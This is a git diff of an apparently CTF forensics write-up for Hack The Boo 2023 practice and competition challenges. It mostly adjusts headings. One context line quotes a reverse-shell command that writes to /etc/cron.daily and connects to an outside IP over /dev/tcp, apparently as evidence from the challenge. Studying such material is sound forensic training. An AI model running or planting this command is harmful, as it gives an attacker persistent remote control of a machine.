@@ -5,7 +5,8 @@ categories: [ctf]
 tags: [forensics,htb]
 ---
 
-# Scenario (Practice Challenges)
+# Forensics
+## Scenario (Practice Challenges)
 > Prepare yourselves, travelers! <br><br>
 Creatures have been stirring in the depths of night. Monstrosities emboldened by the lack of monster slayers have heard their names spoken under fearful breaths. As the Hack The Boo tales are brought to life over a campfire, the unsuspecting villagers cling to the light of the fire in hopes of an even brighter dawn. <br><br>
 The elders are here to guide you in your battles...
@@ -106,7 +107,7 @@ echo "sh -i >& /dev/tcp/82.179.92.206/7331 0>&1" > /etc/cron.daily/testconnect &
 
 ![vul6](/assets/posts/htboo2023/vul6.png)
 
-# Scenario (Competition Challenges)
+## Scenario (Competition Challenges)
 > Are you afraid of the dark? <br><br>
 A fog begins to hang over the villagers, as the denizens of the night have sensed their location deep in the forest. Tooth, claw, and hoof press forward to devour their prey.A grim future awaits our stalwart storytellers. It’s up to you, slayers! <br><br>
 Crush this CTF and save the villagers from their peril. Beware! You won't be getting any help here...
